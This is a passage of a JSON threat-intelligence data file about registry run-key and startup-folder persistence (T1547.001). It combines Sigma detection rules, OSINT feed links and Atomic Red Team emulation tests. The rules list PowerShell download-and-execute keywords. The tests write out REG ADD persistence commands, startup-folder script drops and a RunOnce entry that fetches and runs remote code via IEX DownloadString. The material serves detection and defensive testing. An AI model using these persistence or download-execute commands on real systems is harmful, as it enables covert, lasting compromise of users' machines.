+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: winsock_parameters_base and winsock_parameters and not filter\n  filter:\n  - Details: (Empty)\n  - Image: C:\\Windows\\System32\\MsiExec.exe\n  - Image: C:\\Windows\\syswow64\\MsiExec.exe\n  winsock_parameters:\n    TargetObject|contains:\n    - \\Protocol_Catalog9\\Catalog_Entries\n    - \\NameSpace_Catalog5\\Catalog_Entries\n  winsock_parameters_base:\n    EventType: SetValue\n    TargetObject|contains: \\System\\CurrentControlSet\\Services\\WinSock2\\Parameters\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: d6c2ce7e-afb5-4337-9ca4-4b5254ed0565\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: derived\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: WinSock2 Autorun Keys Modification\n",
+                            "sigma:id": "d6c2ce7e-afb5-4337-9ca4-4b5254ed0565",
+                            "title": "WinSock2 Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "54dd4ef7-f7b2-418e-a191-5def4fbb0033",
+                        "lookup_data": {
+                            "description": "Turla: A Galaxy of Opportunity",
+                            "link": "http://www.botvrij.eu/data/feed-osint/54dd4ef7-f7b2-418e-a191-5def4fbb0033.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1673286950",
+                            "uuid": "54dd4ef7-f7b2-418e-a191-5def4fbb0033",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8d85cf08-bf97-4260-ba49-986a2a65129c",
+                        "lookup_data": {
+                            "description": "Detects potential PowerShell commands or code within registry run keys",
+                            "raw": "author: frack113, Florian Roth\ndate: 2022/03/17\ndescription: Detects potential PowerShell commands or code within registry run keys\ndetection:\n  condition: selection\n  selection:\n    Details|contains:\n    - powershell\n    - 'pwsh '\n    - FromBase64String\n    - .DownloadFile(\n    - .DownloadString(\n    - ' -w hidden '\n    - ' -w 1 '\n    - -windowstyle hidden\n    - -window hidden\n    - ' -nop '\n    - ' -encodedcommand '\n    - -ExecutionPolicy Bypass\n    - Invoke-Expression\n    - IEX (\n    - Invoke-Command\n    - ICM -\n    - Invoke-WebRequest\n    - 'IWR '\n    - ' -noni '\n    - ' -noninteractive '\n    EventType: SetValue\n    TargetObject|contains: \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nfalsepositives:\n- Legitimate admin or third party scripts. Baseline according to your environnement\nid: 8d85cf08-bf97-4260-ba49-986a2a65129c\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://github.com/frack113/atomic-red-team/blob/a9051c38de8a5320b31c7039efcbd3b56cf2d65a/atomics/T1547.001/T1547.001.md#atomic-test-9---systembc-malware-as-a-service-registry\n- https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Suspicious Powershell In Registry Run Keys\n",
+                            "sigma:id": "8d85cf08-bf97-4260-ba49-986a2a65129c",
+                            "title": "Suspicious Powershell In Registry Run Keys",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "cbf93e5d-ca6c-4722-8bea-e9119007c248",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: nt_current_version_base and nt_current_version and not 1 of filter_*\n  filter_edge:\n    Image|endswith: \\MicrosoftEdgeUpdate.exe\n    Image|startswith: C:\\Program Files (x86)\\Microsoft\\Temp\\\n  filter_empty:\n    Details: (Empty)\n  filter_legitimate_subkey:\n    TargetObject|contains: \\Image File Execution Options\\\n    TargetObject|endswith:\n    - \\DisableExceptionChainValidation\n    - \\MitigationOptions\n  filter_msoffice:\n  - TargetObject|contains:\n    - \\ClickToRunStore\\HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\n    - \\ClickToRun\\REGISTRY\\MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\\n  - Image:\n    - C:\\Program Files\\Microsoft Office\\root\\integration\\integrator.exe\n    - C:\\Program Files (x86)\\Microsoft Office\\root\\integration\\integrator.exe\n  filter_ngen:\n    Image|endswith: \\ngen.exe\n    Image|startswith: C:\\Windows\\Microsoft.NET\\Framework\n  filter_officeclicktorun:\n    Image|endswith: \\OfficeClickToRun.exe\n    Image|startswith:\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\\n  filter_onedrive:\n    Details|endswith: \\AppData\\Local\\Microsoft\\OneDrive\\Update\\OneDriveSetup.exe\"\n    Details|startswith: C:\\Windows\\system32\\cmd.exe /q /c del /q \"C:\\Users\\\n    Image|endswith: \\AppData\\Local\\Microsoft\\OneDrive\\StandaloneUpdater\\OneDriveSetup.exe\n    TargetObject|endswith: \\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Delete Cached\n      Update Binary\n  filter_security_extension_dc:\n    Details:\n    - DWORD (0x00000009)\n    - DWORD (0x000003c0)\n    Image: C:\\Windows\\system32\\svchost.exe\n    TargetObject|contains:\n    - \\Winlogon\\GPExtensions\\{827D319E-6EAC-11D2-A4EA-00C04F79F83A}\\PreviousPolicyAreas\n    - \\Winlogon\\GPExtensions\\{827D319E-6EAC-11D2-A4EA-00C04F79F83A}\\MaxNoGPOListChangesInterval\n  nt_current_version:\n    TargetObject|contains:\n    - \\Winlogon\\VmApplet\n    - \\Winlogon\\Userinit\n    - \\Winlogon\\Taskman\n    - \\Winlogon\\Shell\n    - \\Winlogon\\GpExtensions\n    - \\Winlogon\\AppSetup\n    - \\Winlogon\\AlternateShells\\AvailableShells\n    - \\Windows\\IconServiceLib\n    - \\Windows\\Appinit_Dlls\n    - \\Image File Execution Options\n    - \\Font Drivers\n    - \\Drivers32\n    - \\Windows\\Run\n    - \\Windows\\Load\n  nt_current_version_base:\n    EventType: SetValue\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: cbf93e5d-ca6c-4722-8bea-e9119007c248\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/07/05\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: CurrentVersion NT Autorun Keys Modification\n",
+                            "sigma:id": "cbf93e5d-ca6c-4722-8bea-e9119007c248",
+                            "title": "CurrentVersion NT Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "28208707-fe31-437f-9a7f-4b1108b94d2e",
+                        "lookup_data": {
+                            "description": "Detects when a file with a suspicious extension is created in the startup folder",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/10\ndescription: Detects when a file with a suspicious extension is created in the startup\n  folder\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|contains: \\Windows\\Start Menu\\Programs\\Startup\\\n    TargetFilename|endswith:\n    - .vbs\n    - .vbe\n    - .bat\n    - .ps1\n    - .hta\n    - .dll\n    - .jar\n    - .msi\n    - .scr\n    - .cmd\nfalsepositives:\n- Rare legitimate usage of some of the extensions mentioned in the rule\nid: 28208707-fe31-437f-9a7f-4b1108b94d2e\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2023/01/06\nreferences:\n- https://github.com/last-byte/PersistenceSniper\nrelated:\n- id: 2aa0a6b4-a865-495b-ab51-c28249537b75\n  type: similar\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Suspicious Startup Folder Persistence\n",
+                            "sigma:id": "28208707-fe31-437f-9a7f-4b1108b94d2e",
+                            "title": "Suspicious Startup Folder Persistence",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7a4afb4a-3eb1-4966-9c25-7e1ce2b1eb74",
+                        "lookup_data": {
+                            "description": "Unmasking MirrorFace: Operation LiberalFace targeting Japanese political entities | WeLiveSecurity",
+                            "link": "http://www.botvrij.eu/data/feed-osint/7a4afb4a-3eb1-4966-9c25-7e1ce2b1eb74.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1671610618",
+                            "uuid": "7a4afb4a-3eb1-4966-9c25-7e1ce2b1eb74",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "baecf8fb-edbf-429f-9ade-31fc3f22b970",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: office and office_details and not 1 of filter_*\n  filter_avg:\n    Image: C:\\Program Files\\AVG\\Antivirus\\RegSvr.exe\n    TargetObject|contains: \\Microsoft\\Office\\Outlook\\Addins\\Antivirus.AsOutExt\\\n  filter_empty:\n    Details: (Empty)\n  filter_excel:\n    TargetObject|contains:\n    - \\Excel\\Addins\\AdHocReportingExcelClientLib.AdHocReportingExcelClientAddIn.1\\\n    - \\Excel\\Addins\\ExcelPlugInShell.PowerMapConnect\\\n    - \\Excel\\Addins\\NativeShim\\\n    - \\Excel\\Addins\\NativeShim.InquireConnector.1\\\n    - \\Excel\\Addins\\PowerPivotExcelClientAddIn.NativeEntry.1\\\n  filter_officeclicktorun:\n    Image|endswith: \\OfficeClickToRun.exe\n    Image|startswith:\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\\n  filter_outlook:\n    TargetObject|contains:\n    - \\Outlook\\AddIns\\AccessAddin.DC\\\n    - \\Outlook\\AddIns\\ColleagueImport.ColleagueImportAddin\\\n    - \\Outlook\\AddIns\\EvernoteCC.EvernoteContactConnector\\\n    - \\Outlook\\AddIns\\EvernoteOLRD.Connect\\\n    - \\Outlook\\Addins\\Microsoft.VbaAddinForOutlook.1\\\n    - \\Outlook\\Addins\\OcOffice.OcForms\\\n    - \\Outlook\\Addins\\OscAddin.Connect\\\n    - \\Outlook\\Addins\\OutlookChangeNotifier.Connect\\\n    - \\Outlook\\Addins\\UCAddin.LyncAddin.1\n    - \\Outlook\\Addins\\UCAddin.UCAddin.1\n    - \\Outlook\\Addins\\UmOutlookAddin.FormRegionAddin\\\n  office:\n    EventType: SetValue\n    TargetObject|contains:\n    - \\Software\\Wow6432Node\\Microsoft\\Office\n    - \\Software\\Microsoft\\Office\n  office_details:\n    TargetObject|contains:\n    - \\Word\\Addins\n    - \\PowerPoint\\Addins\n    - \\Outlook\\Addins\n    - \\Onenote\\Addins\n    - \\Excel\\Addins\n    - \\Access\\Addins\n    - test\\Special\\Perf\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: baecf8fb-edbf-429f-9ade-31fc3f22b970\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/06/10\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Office Autorun Keys Modification\n",
+                            "sigma:id": "baecf8fb-edbf-429f-9ade-31fc3f22b970",
+                            "title": "Office Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "318557a5-150c-4c8d-b70e-a9910e199857",
+                        "lookup_data": {
+                            "description": "Detects msdt.exe creating files in suspicious directories",
+                            "raw": "author: Vadim Varganov, Florian Roth\ndate: 2022/08/24\ndescription: Detects msdt.exe creating files in suspicious directories\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\msdt.exe\n    TargetFilename|contains:\n    - \\Start Menu\\Programs\\Startup\\\n    - C:\\Users\\Public\\\n    - C:\\PerfLogs\\\n    - \\Desktop\\\n    - C:\\ProgramData\\\nfalsepositives:\n- Unknown\nid: 318557a5-150c-4c8d-b70e-a9910e199857\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd\n- https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\n- cve.2022.30190\ntitle: MSDT.exe Creates Files in Autorun Directory\n",
+                            "sigma:id": "318557a5-150c-4c8d-b70e-a9910e199857",
+                            "title": "MSDT.exe Creates Files in Autorun Directory",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c37510b8-2107-4b78-aa32-72f251e7a844",
+                        "lookup_data": {
+                            "description": "Detects Ryuk ransomware activity",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/12/16\ndescription: Detects Ryuk ransomware activity\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - Microsoft\\Windows\\CurrentVersion\\Run\n    - C:\\users\\Public\\\nfalsepositives:\n- Unlikely\nfields:\n- CommandLine\n- ParentCommandLine\nid: c37510b8-2107-4b78-aa32-72f251e7a844\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://app.any.run/tasks/d860402c-3ff4-4c1f-b367-0237da714ed1/\nstatus: stable\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Ryuk Ransomware\n",
+                            "sigma:id": "c37510b8-2107-4b78-aa32-72f251e7a844",
+                            "title": "Ryuk Ransomware",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                        "lookup_data": {
+                            "description": "Unwrapping Ursnifs Gifts - The DFIR Report",
+                            "link": "http://www.botvrij.eu/data/feed-osint/4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1674763285",
+                            "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f674e36a-4b91-431e-8aef-f8a96c2aca35",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: all of system_control_* and not 1 of filter_*\n  filter_cutepdf:\n    Details:\n    - cpwmon64_v40.dll\n    - CutePDF Writer\n    Image: C:\\Windows\\System32\\spoolsv.exe\n    TargetObject|contains: \\Print\\Monitors\\CutePDF Writer Monitor\n  filter_empty:\n    Details: (Empty)\n  filter_onenote:\n    Image: C:\\Windows\\System32\\spoolsv.exe\n    TargetObject|contains: Print\\Monitors\\Appmon\\Ports\\Microsoft.Office.OneNote_\n    User|contains:\n    - AUTHORI\n    - AUTORI\n  filter_poqexec:\n    Image: C:\\Windows\\System32\\poqexec.exe\n    TargetObject|endswith: \\NetworkProvider\\Order\\ProviderOrder\n  filter_realvnc:\n    Details: VNCpm.dll\n    Image: C:\\Windows\\System32\\spoolsv.exe\n    TargetObject|endswith: \\Print\\Monitors\\MONVNC\\Driver\n  system_control_base:\n    EventType: SetValue\n    TargetObject|contains: \\SYSTEM\\CurrentControlSet\\Control\n  system_control_keys:\n    TargetObject|contains:\n    - \\Terminal Server\\WinStations\\RDP-Tcp\\InitialProgram\n    - \\Terminal Server\\Wds\\rdpwd\\StartupPrograms\n    - \\SecurityProviders\\SecurityProviders\n    - \\SafeBoot\\AlternateShell\n    - \\Print\\Providers\n    - \\Print\\Monitors\n    - \\NetworkProvider\\Order\n    - \\Lsa\\Notification Packages\n    - \\Lsa\\Authentication Packages\n    - \\BootVerificationProgram\\ImagePath\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: f674e36a-4b91-431e-8aef-f8a96c2aca35\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/09/20\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: CurrentControlSet Autorun Keys Modification\n",
+                            "sigma:id": "f674e36a-4b91-431e-8aef-f8a96c2aca35",
+                            "title": "CurrentControlSet Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f663a6d9-9d1b-49b8-b2b1-0637914d199a",
+                        "lookup_data": {
+                            "description": "Detects abusing Windows 10 Narrator's Feedback-Hub",
+                            "raw": "author: Dmitriy Lifanov, oscd.community\ndate: 2019/10/25\ndescription: Detects abusing Windows 10 Narrator's Feedback-Hub\ndetection:\n  condition: 1 of selection*\n  selection1:\n    EventType: DeleteValue\n    TargetObject|endswith: \\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\DelegateExecute\n  selection2:\n    TargetObject|endswith: \\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\(Default)\nfalsepositives:\n- Unknown\nid: f663a6d9-9d1b-49b8-b2b1-0637914d199a\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Narrator's Feedback-Hub Persistence\n",
+                            "sigma:id": "f663a6d9-9d1b-49b8-b2b1-0637914d199a",
+                            "title": "Narrator's Feedback-Hub Persistence",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1547.001",
+                "display_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+                "atomic_tests": [
+                    {
+                        "name": "Reg Key Run",
+                        "auto_generated_guid": "e55be3fd-3521-4610-9d1a-e210e42dcf05",
+                        "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "command_to_execute": {
+                                "description": "Thing to Run",
+                                "type": "path",
+                                "default": "C:\\Path\\AtomicRedTeam.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"#{command_to_execute}\"\n",
+                            "cleanup_command": "REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f >nul 2>&1\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Reg Key RunOnce",
+                        "auto_generated_guid": "554cbd88-cde1-4b56-8168-0be552eed9eb",
+                        "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "thing_to_execute": {
+                                "description": "Thing to Run",
+                                "type": "path",
+                                "default": "C:\\Path\\AtomicRedTeam.dll"
+                            }
+                        },
+                        "executor": {
+                            "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"#{thing_to_execute}\"\n",
+                            "cleanup_command": "REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f >nul 2>&1\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "PowerShell Registry RunOnce",
+                        "auto_generated_guid": "eb44f842-0457-4ddc-9b92-c4caa144ac42",
+                        "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "thing_to_execute": {
+                                "description": "Thing to Run",
+                                "type": "path",
+                                "default": "powershell.exe"
+                            },
+                            "reg_key_path": {
+                                "description": "Path to registry key to update",
+                                "type": "path",
+                                "default": "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+                            }
+                        },
+                        "executor": {
+                            "command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'\n",
+                            "cleanup_command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Suspicious vbs file run from startup Folder",
+                        "auto_generated_guid": "2cb98256-625e-4da9-9d44-f2e5f90b8bd5",
+                        "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n",
+                            "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" -ErrorAction Ignore\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Suspicious jse file run from startup Folder",
+                        "auto_generated_guid": "dade9447-791e-4c8f-b04b-3a35855dfa06",
+                        "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n",
+                            "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" -ErrorAction Ignore\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Suspicious bat file run from startup Folder",
+                        "auto_generated_guid": "5b6768e4-44d2-44f0-89da-a01d1430fd5e",
+                        "description": "bat files can be placed in and executed from the startup folder to maintain persistance\n\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n",
+                            "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\" -ErrorAction Ignore\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Add Executable Shortcut Link to User Startup Folder",
+                        "auto_generated_guid": "24e55612-85f6-4bd6-ae74-a73d02e3441d",
+                        "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "$Target = \"C:\\Windows\\System32\\calc.exe\"\n$ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"\n$WScriptShell = New-Object -ComObject WScript.Shell\n$Create = $WScriptShell.CreateShortcut($ShortcutLocation)\n$Create.TargetPath = $Target\n$Create.Save()      ",
+                            "cleanup_command": "Remove-Item \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" -ErrorAction Ignore",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Add persistance via Recycle bin",
+                        "auto_generated_guid": "bda6a3d6-7aa7-4e89-908b-306772e9662f",
+                        "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n",
